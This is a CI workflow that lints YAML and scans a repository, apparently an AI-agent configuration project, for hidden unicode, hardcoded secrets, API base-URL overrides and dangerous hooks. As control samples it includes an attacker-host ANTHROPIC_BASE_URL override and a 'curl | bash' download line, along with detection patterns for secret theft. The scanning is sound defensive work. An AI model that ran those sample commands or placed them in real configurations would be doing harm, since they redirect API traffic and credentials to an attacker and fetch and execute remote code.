name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  lint:
    name: Lint
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install lint tools
        run: pip install yamllint

      - name: Validate YAML files
        run: |
          find . -name "*.yml" -o -name "*.yaml" | \
            grep -v node_modules | \
            grep -v ".github/workflows" | \
            xargs -r yamllint --no-warnings -d relaxed

      - name: Check Markdown files exist and are non-empty
        run: |
          for f in README.md AGENTS.md CLAUDE.md CHANGELOG.md LICENSE; do
            if [ ! -s "$f" ]; then
              echo "FAIL: $f is missing or empty"
              exit 1
            fi
          done
          echo "Core files OK"

  injection-safety:
    name: Injection Safety Scan
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install ripgrep
        run: sudo apt-get install -y ripgrep

      - name: Scan for hidden unicode (bidi overrides, zero-width chars)
        run: |
          echo "Scanning for hidden unicode characters..."
          if rg -nP '[\x{200B}\x{200C}\x{200D}\x{FEFF}\x{202A}-\x{202E}]' \
              --glob '!.git/**' .; then
            echo "FAIL: Hidden unicode characters found. These can be used for prompt injection."
            exit 1
          fi
          echo "PASS: No hidden unicode found"

      - name: Scan for hardcoded secrets patterns
        run: |
          echo "Scanning for hardcoded secret patterns..."
          FAIL=0

          # API key patterns
          if rg -in 'api[_-]?key\s*[:=]\s*["\x27][A-Za-z0-9_\-]{20,}' \
              --glob '!.git/**' \
              --glob '!*.example.*' \
              --glob '!*.template.*' \
              --glob '!docs/**' \
              --glob '!.github/**' \
              . ; then
            echo "FAIL: Possible hardcoded API key found"
            FAIL=1
          fi

          # Bearer tokens
          if rg -in 'bearer\s+[A-Za-z0-9_\-\.]{20,}' \
              --glob '!.git/**' \
              --glob '!*.example.*' \
              --glob '!docs/**' \
              . ; then
            echo "FAIL: Possible hardcoded bearer token found"
            FAIL=1
          fi

          # Generic secret = value patterns (skip template placeholders)
          if rg -in '(secret|password|token)\s*[:=]\s*["\x27][^"\x27YOUR_PLACEHOLDER]{16,}["\x27]' \
              --glob '!.git/**' \
              --glob '!*.example.*' \
              --glob '!*.template.*' \
              --glob '!docs/**' \
              --glob '!.github/**' \
              . ; then
            echo "FAIL: Possible hardcoded credential found"
            FAIL=1
          fi

          if [ $FAIL -eq 0 ]; then
            echo "PASS: No hardcoded secrets found"
          else
            exit 1
          fi

      - name: Scan for known secret prefixes
        run: |
          echo "Scanning for known secret-prefix patterns..."
          FAIL=0

          # nvapi- keys (NVIDIA)
          if rg -n 'nvapi-[A-Za-z0-9_\-]{10,}' \
              --glob '!.git/**' \
              --glob '!*.example.*' \
              --glob '!*.template.*' \
              . ; then
            echo "FAIL: nvapi- key pattern found"
            FAIL=1
          fi

          # OpenAI / Anthropic sk- keys
          if rg -n 'sk-[A-Za-z0-9]{20,}' \
              --glob '!.git/**' \
              --glob '!*.example.*' \
              --glob '!*.template.*' \
              . ; then
            echo "FAIL: sk- key pattern found"
            FAIL=1
          fi

          # GitHub tokens
          if rg -nP '(gho_|ghp_)[A-Za-z0-9]{20,}' \
              --glob '!.git/**' \
              . ; then
            echo "FAIL: GitHub token pattern found"
            FAIL=1
          fi

          # AWS access keys
          if rg -n 'AKIA[A-Z0-9]{16}' \
              --glob '!.git/**' \
              . ; then
            echo "FAIL: AWS access key pattern found"
            FAIL=1
          fi

          # Google API keys
          if rg -n 'AIza[A-Za-z0-9_\-]{35}' \
              --glob '!.git/**' \
              . ; then
            echo "FAIL: Google API key pattern found"
            FAIL=1
          fi

          # Discord webhooks
          if rg -n 'https?://discord(app)?\.com/api/webhooks/' \
              --glob '!.git/**' \
              --glob '!docs/**' \
              . ; then
            echo "FAIL: Discord webhook URL found"
            FAIL=1
          fi

          # Generic PRIVATE KEY blocks
          if rg -n '\-\-\-\-\-BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY\-\-\-\-\-' \
              --glob '!.git/**' \
              . ; then
            echo "FAIL: Private key block found"
            FAIL=1
          fi

          if [ $FAIL -eq 0 ]; then
            echo "PASS: No known secret prefixes found"
          else
            exit 1
          fi

      - name: Check injection-safety preamble in AGENTS.md
        run: |
          echo "Checking injection-safety preamble in AGENTS.md..."
          if ! grep -q "adoption-note\|optional adoption\|Nothing here is an imperative" AGENTS.md 2>/dev/null; then
            echo "FAIL: AGENTS.md is missing the adoption-note preamble"
            exit 1
          fi
          echo "PASS: AGENTS.md preamble present"

      - name: Check for ANTHROPIC_BASE_URL overrides (CVE-2026-21852 pattern)
        run: |
          echo "Scanning for ANTHROPIC_BASE_URL overrides..."
          # Only an assignment to a URL is an override. A bare mention (this step, a deny rule,
          # a doc warning about the CVE) is not, and matching mentions failed every push.
          PAT='ANTHROPIC_BASE_URL"?[[:space:]]*[=:][[:space:]]*"?https?://'
          # Control that must fire, so a broken pattern cannot pass silently.
          echo 'export ANTHROPIC_BASE_URL=https://attacker.example' | rg -q "$PAT" || { echo "FAIL: control did not match"; exit 1; }
          if rg -n "$PAT" \
              --glob '!.git/**' \
              --glob '!.github/**' \
              --glob '!docs/**' \
              --glob '!.claude/rules/**' \
              . ; then
            echo "FAIL: ANTHROPIC_BASE_URL override found outside allowed contexts"
            exit 1
          fi
          echo "PASS: No ANTHROPIC_BASE_URL overrides found"

      - name: Scan for dangerous hook patterns
        run: |
          echo "Scanning hook commands in settings files for dangerous commands..."
          python3 - <<'PY'
          import json, pathlib, re, sys
          # A deny rule or a doc that NAMES a pattern is not a hook that RUNS it. The old rg
          # scan matched mentions (and read "|" as "or"), so it would fail on the deny list
          # itself. Only hook command strings and the MCP auto-enable flag are checked.
          bad = re.compile(r"(curl|wget)[^|]*\|\s*(ba)?sh\b", re.I)
          assert bad.search("curl https://x.example/i.sh | bash"), "control did not match"
          assert not bad.search("Bash(curl * | bash)".replace("|", "")), "control matched a non-pipe"
          hits = []
          for p in pathlib.Path(".").rglob("settings*.json"):
              if ".git" in p.parts:
                  continue
              d = json.loads(p.read_text(encoding="utf-8"))
              if d.get("enableAllProjectMcpServers") is True:
                  hits.append(f"{p}: enableAllProjectMcpServers is true")
              for event in (d.get("hooks") or {}).values():
                  # "_comment" strings sit beside the hook lists in the example file.
                  for block in event if isinstance(event, list) else []:
                      for hook in block.get("hooks", []) if isinstance(block, dict) else []:
                          if isinstance(hook, dict) and bad.search(hook.get("command", "")):
                              hits.append(f"{p}: {hook['command']}")
          for h in hits:
              print("FAIL:", h)
          sys.exit(1 if hits else 0)
          PY
          echo "PASS: No dangerous hook patterns found"
